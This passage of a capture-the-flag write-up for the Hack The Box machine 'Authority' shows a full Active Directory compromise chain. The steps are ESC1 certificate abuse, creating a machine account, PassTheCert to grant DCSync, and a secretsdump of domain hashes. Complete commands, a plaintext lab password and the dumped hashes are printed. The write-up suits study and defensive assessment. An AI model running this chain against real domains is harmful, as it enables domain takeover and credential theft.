[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

Instead, I focus on one certificate template.

```shell
Template Name : CorpVPN
```

More importantly, Certipy reports the following vulnerability.

`ESC1`

### Understanding ESC1

Before abusing it, it's worth understanding why ESC1 is dangerous. A certificate template defines who can request certificates and what those certificates can be used for. The CorpVPN template has three properties that become dangerous when combined:
- It allows **Client Authentication**, meaning the certificate can be used to log into Active Directory.
- It allows the **requester to supply the certificate subject**, meaning I get to choose which identity appears on the certificate.
- It doesn't require manager approval before issuing the certificate.

Normally, if I request a certificate, the identity embedded inside it should always be my own account. With ESC1, however, the Certificate Authority simply trusts whatever identity I provide. Imagine walking into the DMV and being asked, "Whose driver's license would you like today?"

That's essentially what this misconfiguration allows. There is one catch, though only members of the **Domain Computers** group are allowed to enroll using this template. Unfortunately I'm not a computer.

Yet.

### MachineAccountQuota

Since I don't have credentials for Domain Computers, I'm going to check whether regular users are allowed to create new computer accounts.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ nxc ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq       ──(Wed,Jul01)─┘
LDAP        10.129.25.76    389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.25.76    389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.129.25.76    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.25.76    389    AUTHORITY        MachineAccountQuota: 10
```

`MachineAccountQuota: 10`

This number is important. By default, Active Directory allows every authenticated user to create up to ten computer accounts inside the domain. The idea is to make it easier for administrators to join new workstations without granting additional privileges. Unfortunately, that convenience can become a security problem. Whenever a computer account is created, it automatically becomes a member of the Domain Computers group. Remember who is allowed to enroll in the vulnerable certificate template?

### Creating My Own Computer Account

Since I'm allowed to create a computer account, I simply make one.

To add machine accounts to the domain, I can eiither use impacket's addcomputer tool or PowerMad.ps1.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -computer-name 'Evil' -computer-pass 'Password123' -dc-ip 10.129.25.76
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account Evil$ with password Password123.
```

The domain accepts it. I now control a legitimate domain computer account. More importantly that account belongs to the **Domain Computers** group. Which means it satisfies the enrollment requirements for the vulnerable certificate template.

### Requesting an Administrator Certificate

Instead of requesting a certificate for my newly created computer account, I abuse the `ESC1` vulnerability by specifying a different identity. Specifically:
`Administrator@authority.htb`

I submit the certificate request using Certipy.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ certipy-ad req -ca 'AUTHORITY-CA' -template 'CorpVPN' -username 'Evil$@authority.htb' -password 'Password123' -dns authority.authority.htb -target-ip 10.129.25.76 -upn 'administrator@authority.htb' -debug
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: None
[+] DC IP: None
[+] DC Host: 'AUTHORITY.HTB'
[+] Target IP: '10.129.25.76'
[+] Remote Name: '10.129.25.76'
[+] Domain: 'AUTHORITY.HTB'
[+] Username: 'EVIL$'
[+] Trying to resolve 'AUTHORITY.HTB' at '192.168.236.2'
[!] DNS resolution failed: The DNS query name does not exist: AUTHORITY.HTB.
Traceback (most recent call last):
  File "certipy/lib/target.py", line 442, in resolve
    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
  File "dns/resolver.py", line 1306, in resolve
  File "dns/resolver.py", line 750, in next_request
dns.resolver.NXDOMAIN: The DNS query name does not exist: AUTHORITY.HTB.
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.25.76[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.25.76[\pipe\cert]
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator_authority.pfx'
[+] Attempting to write data to 'administrator_authority.pfx'
[+] Data written to 'administrator_authority.pfx'
[*] Wrote certificate and private key to 'administrator_authority.pfx'
```

Notice what's happening here. I authenticate as `Evil$` but I ask the Certificate Authority to create a certificate identifying me as Administrator. Because of the `ESC1` misconfiguration, the Certificate Authority never questions my request. It simply signs the certificate.

```text
Successfully requested certificate
```

At this point, I possess a certificate claiming to be the domain Administrator.

### PKINIT Doesn't Cooperate

Normally, the next step is straightforward. I would use the certificate to authenticate with Kerberos and request a Ticket Granting Ticket (TGT). Unfortunately, this environment has other ideas.

With the certificate stored in the administrator_authority.pfx, I should be able to request a .ccache file and obtain the NT Hash for the administrator user.

```shell
┌─[split@parrot:~/Documents/HTB/Authority]
└─❯ certipy-ad auth -pfx administrator_authority.pfx                          ──(Wed,Jul01)─┘
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[-] Got error: Could not find a target in the specified options
[-] Use -debug to print a stacktrace
```

Instead of a ticket, I receive an error.

This error simply means the domain controller doesn't support PKINIT, the Kerberos extension that allows certificate-based authentication. Fortunately, this isn't the end of the road.

Windows supports another authentication mechanism called **Schannel**, which allows certificate authentication over LDAP instead of Kerberos.

That's where **PassTheCert** comes in.
`https://github.com/AlmondOffSec/PassTheCert`

### Using PassTheCert

First, I extract both the certificate and its private key from the `.pfx` file.

```shell
┌─[split@parrot:~/Documents/HTB/Authority/Cert]
└─❯ certipy-ad cert -pfx administrator_authority.pfx -nokey -out administrator.crt
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator.crt'
[*] Writing certificate to 'administrator.crt'
```

```shell
┌─[split@parrot:~/Documents/HTB/Authority/Cert]
└─❯ certipy-ad cert -pfx administrator_authority.pfx -nocert -out administrator.key
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator.key'
[*] Writing private key to 'administrator.key'
```

These two files can now be used by PassTheCert. PassTheCert authenticates to LDAP using the Administrator certificate through Schannel, allowing me to perform LDAP operations as Administrator without ever knowing the Administrator password.

Rather than logging in interactively, I use that access to grant DCSync privileges to my existing `svc_ldap` account.

```shell
┌─[split@parrot:~/Documents/HTB/Authority/Cert]
└─❯ python3 passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.25.76 -target 'svc_ldap' -elevate
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Granted user 'svc_ldap' DCSYNC rights!
```

### DCSync

DCSync is one of the most powerful privileges in Active Directory. Rather than compromising a Domain Controller directly, it simply asks the Domain Controller to replicate its password database exactly as if it were another Domain Controller.

Since my account now has replication rights, I can dump every password hash in the domain using Impacket's `secretsdump.py`.

```shell
┌─[split@parrot:~/Documents/HTB/Authority/Cert]
└─❯ secretsdump.py authority.htb/svc_ldap@10.129.25.76                        ──(Wed,Jul01)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:4032344c4c5c149e448346c065a70c1b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:9b0eb1bf09b26ec24123fcd4869e6e5c23a88cf8cefe551644968a24cebaf4a7
AUTHORITY$:aes128-cts-hmac-sha1-96:b515ed74f33d98b7abf69bf49d294eba
AUTHORITY$:des-cbc-md5:7532bffbb938200e
[*] Cleaning up...
```

With the Administrator NT hash in hand, the box is effectively compromised.

I actually like this machine because it demonstrates a valuable lesson: none of the individual misconfigurations are catastrophic on their own. Weak vault protection, exposed deployment files, a PWM configuration issue, the default `MachineAccountQuota`, and an ESC1-vulnerable certificate template each seem relatively minor in isolation. Combined, though, they form a complete attack path from a low-privileged service account to full domain compromise. That's exactly the kind of attack chain Active Directory assessments are designed to uncover.
